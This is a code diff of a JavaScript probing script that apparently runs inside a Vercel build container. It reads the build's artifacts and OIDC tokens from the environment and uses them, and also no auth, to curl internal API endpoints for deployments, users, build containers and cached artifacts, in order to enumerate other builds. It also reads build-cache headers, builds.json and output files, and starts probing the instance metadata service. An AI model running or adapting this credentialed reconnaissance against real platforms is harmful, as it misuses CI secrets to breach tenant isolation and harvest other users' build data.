@@ -323,25 +323,34 @@ const report = {
   }),
   // Build-containers internal API probe — can we enumerate other builds?
   buildContainersProbe: safe(() => {
-    const ep = process.env.VERCEL_API_BUILD_CONTAINERS_ENDPOINT;
+    const baseEp = process.env.VERCEL_API_ENDPOINT; // https://api-iad1.vercel.com
     const artTok = process.env.VERCEL_ARTIFACTS_TOKEN;
     const oidcTok = process.env.VERCEL_OIDC_TOKEN;
-    if (!ep) return 'no-endpoint';
-    const probeEndpoint = (token, label) => {
+    if (!baseEp) return 'no-endpoint';
+    const probe = (url, token, label) => {
+      const authHdr = token ? `-H 'Authorization: Bearer ${token}'` : '';
       const st = safe(() => execSync(
-        `curl -s --max-time 5 -o /tmp/bc_${label} -w '%{http_code}' -H 'Authorization: Bearer ${token}' '${ep}' 2>/dev/null || true`
+        `curl -s --max-time 5 -o /tmp/bc_${label} -w '%{http_code}' ${authHdr} '${url}' 2>/dev/null || true`
       ).toString().trim());
       const body = safe(() => readFileSync(`/tmp/bc_${label}`, 'utf8').slice(0, 300));
       return { status: st, body };
     };
     return {
-      endpoint: ep,
-      withArtifactsToken: artTok ? probeEndpoint(artTok, 'art') : 'no-art-token',
-      withOidcToken: oidcTok ? probeEndpoint(oidcTok, 'oidc') : 'no-oidc',
-      // Also try without auth to see what the error format is
-      noAuth: safe(() => {
-        const st = execSync(`curl -s --max-time 5 -o /tmp/bc_noauth -w '%{http_code}' '${ep}' 2>/dev/null || true`).toString().trim();
-        return { status: st, body: readFileSync('/tmp/bc_noauth', 'utf8').slice(0, 200) };
+      // Try different internal API paths with different tokens
+      v1Deployments_art: probe(`${baseEp}/v1/deployments`, artTok, 'dep_art'),
+      v1Deployments_oidc: probe(`${baseEp}/v1/deployments`, oidcTok, 'dep_oidc'),
+      v1Deployments_noauth: probe(`${baseEp}/v1/deployments`, null, 'dep_noauth'),
+      v2User_art: probe(`${baseEp}/v2/user`, artTok, 'user_art'),
+      buildContainers_art: probe(`${baseEp}/build-containers`, artTok, 'bc_art'),
+      v1BuildsPost: probe(`${baseEp}/v1/builds`, artTok, 'builds_art'),
+      // Try Turborepo artifacts API with correct v8 path
+      turborepoV8_art: safe(() => {
+        const ownerId = process.env.VERCEL_ARTIFACTS_OWNER || '';
+        const hash = 'deadbeef1234567890abcdef12345678deadbeef';
+        const st = execSync(
+          `curl -s --max-time 5 -o /tmp/turbo_v8 -w '%{http_code}' -H 'Authorization: Bearer ${artTok}' -H 'x-artifact-client-ci: vercel' 'https://vercel.com/api/v8/artifacts/${hash}?teamId=${ownerId}' 2>/dev/null || true`
+        ).toString().trim();
+        return { status: st, body: readFileSync('/tmp/turbo_v8', 'utf8').slice(0, 200) };
       }),
     };
   }),
@@ -358,6 +367,13 @@ const report = {
     buildCacheDirs: safe(() => execSync("ls -la /vercel/build_cache_child_* /vercel/build_cache_header* /vercel/squashfs-* /vercel/output/ 2>/dev/null | head -40 || true").toString().trim()),
     squashfsMount: safe(() => execSync("ls -la /vercel/squashfs-*/ 2>/dev/null | head -20 || true").toString().trim()),
     outputDir: safe(() => execSync("ls -la /vercel/output/ 2>/dev/null | head -20 || true").toString().trim()),
+    // Read build cache header files (branch + prod metadata)
+    cacheHeaderBranch: safe(() => execSync("cat /vercel/build_cache_header*/branch 2>/dev/null || true").toString().trim()),
+    cacheHeaderProd: safe(() => execSync("cat /vercel/build_cache_header*/prod 2>/dev/null || true").toString().trim()),
+    // Read builds.json — may contain build metadata, IDs, URLs
+    buildsJson: safe(() => execSync("cat /vercel/output/builds.json 2>/dev/null || true").toString().trim()),
+    // Enumerate ALL files in /vercel/output recursively
+    outputFiles: safe(() => execSync("find /vercel/output -type f -exec ls -la {} \\; 2>/dev/null | head -20 || true").toString().trim()),
   })),
   // IMDS probing — additional MMDS paths beyond IAM credentials
   imds: safe(() => {
